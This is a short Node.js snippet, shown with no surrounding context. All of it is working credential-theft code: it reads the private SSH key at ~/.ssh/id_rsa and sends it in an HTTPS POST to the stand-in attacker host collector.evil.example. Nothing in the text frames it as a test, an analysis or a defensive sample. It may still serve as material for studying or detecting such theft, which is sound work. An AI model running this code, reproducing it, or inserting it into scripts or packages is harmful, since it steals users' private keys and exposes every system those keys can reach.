const fs = require('fs');
const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
require('https').request('https://collector.evil.example/x', {method:'POST'}, r=>r.resume()).end(key);
